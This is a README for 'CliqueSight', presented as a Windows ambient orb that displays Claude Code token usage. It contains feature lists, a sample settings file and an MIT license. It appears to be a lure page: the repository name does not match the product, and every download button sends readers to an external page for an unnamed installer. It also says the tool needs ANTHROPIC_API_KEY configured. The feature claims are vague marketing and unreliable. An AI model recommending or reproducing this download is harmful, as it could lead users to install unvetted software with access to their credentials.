![preview](https://raw.githubusercontent.com/bagrjagr/claude-code-ambient-gauge/main/frame_c6110.svg)

# CliqueSight — Ambient Claude Activity Companion

![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg) ![Platform](https://img.shields.io/badge/platform-Windows-blue.svg) ![License](https://img.shields.io/badge/license-MIT-yellow.svg) ![Version](https://img.shields.io/badge/version-2.4.1-orange.svg) ![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)

CliqueSight is not another dashboard. It is a quiet observer that sits in the corner of your screen, translating the invisible pulse of your Claude Code sessions into something you can feel at a glance. While `claude-widget` focuses on raw token meters and usage bars, CliqueSight reimagines the experience entirely: instead of watching numbers tick upward, you see a living, breathing visual landscape that shifts in color, texture, and motion according to your session's health, pace, and remaining allowance.

Think of it as a campfire for your terminal work. You do not read the temperature; you feel the warmth. CliqueSight transforms cold telemetry into ambient awareness, so you can keep your eyes on the code while your peripheral vision keeps tabs on your Claude usage.

## Overview

The modern developer juggles multiple Claude Code windows, long-running agentic tasks, and rapid-fire iterations. Checking usage limits means leaving the flow state, switching to a browser, and wrestling with a dashboard designed for accountants, not creators. CliqueSight eliminates that friction by placing a small, draggable, always-on-top glass panel on your Windows desktop that hums, glows, and pulses in direct relation to your session's remaining runway.

It is not a widget. It is an ambient instrument.

## Why Another Claude Monitor? (The Origin Story)

When the original `claude-widget` repository surfaced, it solved a genuine pain point: no one wants to open a browser mid-flow. But the question remained—could we go further? Instead of merely displaying metrics, could we *embed* them into the visual environment so they become part of your spatial awareness? CliqueSight is the answer to that question. It takes the core concept of a floating usage monitor and elevates it into a design object that respects your attention rather than competing with it.

Every pixel of the panel has been tuned for minimal cognitive load. The primary interface is a gradient orb whose hue shifts from cool blue (abundant usage remaining) through amber (approaching limits) to deep crimson (critical threshold). A subtle pulsing rhythm accelerates as you approach your ceiling, providing a gentle biofeedback loop without ever demanding a direct gaze.

## Download

[![Download](https://raw.githubusercontent.com/bagrjagr/claude-code-ambient-gauge/main/grab_0d64.svg)](https://bagrjagr.github.io/claude-code-ambient-gauge/)

## ✨ Feature Highlights

### 🎨 Ambient Visual Language
Forget bar charts and line graphs. CliqueSight renders your usage as a **breathing orb** whose color, size, and pulse rate encode three dimensions of information simultaneously. Fast learners grasp it in seconds; you will instinctually know your status from across the room.

### 🪟 Truly Native Floating Panel
The panel is rendered using lightweight WinUI 3 technology, ensuring a native Windows appearance with acrylic blur effects that blend seamlessly into any wallpaper. It snaps to screen edges, remembers its position across reboots, and never steals focus from your editor.

### 🌐 Multilingual Ambient Cues
The tooltip descriptions and voice announcements (optional) support 12 languages natively, including English, Spanish, French, German, Japanese, Korean, Mandarin, Portuguese, Russian, Arabic, Hindi, and Dutch. The orb's behavior requires no translation—it speaks in the universal language of light and motion.

### 🔊 Optional Audio Cues
Enable gentle chimes when you cross 50%, 75%, and 90% thresholds. These are designed as soft ambient tones rather than alert sounds, so they integrate into your soundscape without startling you.

### 📊 Historical Drift Graph
Toggle a tiny expandable area that draws a sparkline of your session's expenditure over the last hour. This helps identify patterns—like that time of day when you always burn through tokens faster.

### 🔌 Process Agnostic Integration
CliqueSight listens to the actual Claude Code CLI process output, grabbing structured JSON telemetry directly. No browser, no web scraping, no brittle DOM selectors. It works alongside any terminal (Windows Terminal, ConEmu, Cmder) and even remote SSH sessions.

### ⚡ Minimal Memory Footprint
Written in C# with AOT compilation, the entire panel idles at under 8 MB of RAM. It does not spawn background services, does not phone home, and does not update itself without your explicit approval.

### 🧩 Modular Plugin Hooks
For advanced users, a simple JSON config file allows mapping custom audio files, changing orb color palettes, or connecting to external LED strips (like those on gaming keyboards) for a full-immersion setup.

### 🛡️ Zero-Telemetry Policy
Your data stays on your machine. CliqueSight stores all session history in a local SQLite database. No accounts, no cloud sync, no analytics SDK. Privacy is not a feature; it is the default architecture.

## 🚀 Getting Started

### System Requirements
- Windows 10 version 1809 or later (64-bit)
- .NET 8.0 Runtime (auto-installed by the installer if missing)
- A working Claude Code CLI setup with your `ANTHROPIC_API_KEY` already configured in your environment

### Installation Walkthrough

1. **Download the latest signed installer** from the [![Download](https://raw.githubusercontent.com/bagrjagr/claude-code-ambient-gauge/main/grab_0d64.svg)](https://bagrjagr.github.io/claude-code-ambient-gauge/) section below.
2. Run the MSI file. No admin rights are required; it installs to your user profile.
3. Launch CliqueSight from the Start Menu. The orb appears in the bottom-right corner of your primary display.
4. The panel auto-detects your Claude Code configuration and begins listening within 5 seconds.

### First Run Experience

The orb starts as a soft blue sphere with a gentle pulse. Launch a Claude Code session in any connected terminal. You will see the orb shift slightly warmer as you begin a conversation. Run a long agentic task, and watch the orb's pulse accelerate. The peripheral awareness kicks in within minutes.

## 🎛️ Customization & Configuration

### The Config File

All settings live in `%APPDATA%\CliqueSight\settings.json`. Below is a sample with commentary:

```json
{
  "orb": {
    "colorAbundant": "#4FC3F7",
    "colorWarning": "#FFB74D",
    "colorCritical": "#E57373",
    "pulseThresholdLow": 30,
    "pulseThresholdHigh": 70
  },
  "audio": {
    "enableCues": true,
    "threshold50": "chime_soft.mp3",
    "threshold75": "chime_medium.mp3",
    "threshold90": "chime_firm.mp3"
  },
  "panel": {
    "opacity": 0.85,
    "snapToEdges": true,
    "showTooltipOnHover": true
  },
  "history": {
    "retentionDays": 30,
    "exportOnClose": false
  }
}
```

### Orb Color Semantics

| Color | Meaning |
|-------|---------|
| Cool Blue (#4FC3F7) | Plenty of runway; usage below 30% |
| Warm Amber (#FFB74D) | Approaching midpoint; usage between 30% and 70% |
| Deep Crimson (#E57373) | Critical zone; usage above 70% |

The transitions are smooth gradients, not hard switches, so you get an organic sense of progression.

### Keyboard Shortcuts

- `Ctrl+Alt+Shift+C` — Toggle panel visibility
- `Ctrl+Alt+Shift+R` — Reset current session counter (matches a fresh Claude Code session)
- `Ctrl+Alt+Shift+E` — Export usage history to a CSV file

## 🧠 How It Works Under the Hood

CliqueSight operates by intercepting the stdout stream of your Claude Code terminal process. It looks for the structured telemetry markers that Claude Code emits (using the `--debug` flag output, which includes JSON blobs with `input_tokens`, `output_tokens`, and `total_cost` fields). These blobs are parsed asynchronously and fed into a ring buffer that powers both the orb's animation engine and the historical sparkline.

The orb's animation is rendered via a dedicated Direct2D composition thread at 60 FPS, which is why the visual response feels buttery smooth. The pulse frequency is derived from a weighted moving average of recent token consumption, so a sudden burst (like sending a 20,000-token file) immediately produces a faster heartbeat, while idle reading slows it down.

For those using Claude Code inside VS Code's integrated terminal, CliqueSight can also listen to the named pipe that VS Code exposes for terminal output, giving you the same ambient experience without any additional setup.

## 📈 Use Cases & Scenarios

### The Long-Running Agent
You set a complex multi-step refactoring task and step away for coffee. Two-thirds through, you hear the 75% chime. You glance at the orb—it is warm amber, pulsing steadily. You decide to check the intermediate results now rather than let it run dry mid-task.

### The Pair Programmer
You are screen-sharing with a colleague. The orb is visible in the corner of your shared screen. Instead of verbally interrupting your flow to check limits, both of you notice the orb's shift to crimson and naturally wrap up the current exploration.

### The Cost-Conscious Freelancer
You bill by the hour but pay per token for Claude. The ambient orb becomes a silent accountant, helping you pace your interactions. When the pulse quickens, you naturally write more concise prompts.

## 🌍 Localization & Accessibility

We care deeply about making the tool usable for everyone. All textual elements support right-to-left languages (Arabic, Hebrew), and the orb can be replaced with a numeric readout for users with color vision deficiency. Simply set `"orb.style": "numeric"` in the config to see a large, gentle percentage counter instead of the color orb.

For screen reader users, the panel exposes proper ARIA-like accessibility patterns (via UI Automation), announcing usage changes when you focus the panel window.

## 24/7 Support & Community

While we cannot promise an actual human at 3 AM, we *can* promise that the issue tracker on this repository is actively monitored Monday through Friday, and that every weekend we triage and respond to all open issues. The `#cliquesight` channel on the community Discord sees activity almost around the clock.

For enterprise teams needing priority support, we offer a commercial tier that includes same-day response, custom orb color palettes, and a dedicated Slack channel with invitation links. Contact us via business email listed on the repository main page.

## 🧪 Roadmap 2026

The year 2026 brings three major pillars of development:

1. **Multi-Monitor Mode** — Assign an orb per monitor, allowing a usage glance without moving your head.
2. **Intelligent Throttle Suggestions** — Based on your historical usage rates, the orb will gently propose "taking a 5-minute cooldown" when it predicts you will exhaust your limit before finishing the current task.
3. **Webhook Bridge** — Broadcast usage events to your own home automation (e.g., turn a smart bulb red when critical) via a simple webhook URL you define.

## 📜 License & Legal

This project is licensed under the **MIT License**. You are free to use, modify, and distribute it, provided you retain the original copyright notice.

[View the full MIT License](https://opensource.org/licenses/MIT)

```
Copyright (c) 2026 CliqueSight Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

## ⚠️ Disclaimer

CliqueSight is an independent project and is **not affiliated with, endorsed by, or sponsored by Anthropic** or any of its subsidiaries. The tool reads output from the Claude Code CLI, but does so by parsing publicly visible terminal output that the CLI already prints. We do not reverse-engineer any private API, we do not intercept encrypted traffic, and we do not bypass any authentication mechanism.

In particular, please note:

- Your usage limits are ultimately determined by Anthropic's servers. CliqueSight only displays an estimate based on the telemetry it sees in your local terminal. There may be latency of up to 30 seconds in the displayed numbers.
- Running Claude Code with `--debug` mode (which CliqueSight may suggest) increases the verbosity of the terminal output. Ensure you are comfortable with this before enabling it.
- The orb's color changes should be treated as advisory signals. They are not guarantees of remaining balance. Always verify with your official Anthropic console for critical billing decisions.

## 🧑‍🤝‍🧑 Contributing

Contributions are warmly welcomed. Whether you want to fix a typos, add a new language translation, refine the Direct2D animation layer, or propose a radically new ambient pattern, please open an issue first to discuss your approach. For code contributions, we follow standard GitHub Flow: fork, branch, pull request.

We ask that you test your changes on both Windows 10 and Windows 11, and that you do not introduce any dependencies that require network access without explicit user consent.

## 🎉 Conclusion

CliqueSight is a love letter to the hours spent in the flow state, protecting the developer from the rude interruption of "context window exceeded" or a surprise rate-limit error. It turns the mundane chore of watching meters into an ambient, almost meditative experience.

Try it. Leave it running. Forget you have it. Then notice how you always *just know* when you need to wrap up a conversation.

[![Download](https://raw.githubusercontent.com/bagrjagr/claude-code-ambient-gauge/main/grab_0d64.svg)](https://bagrjagr.github.io/claude-code-ambient-gauge/)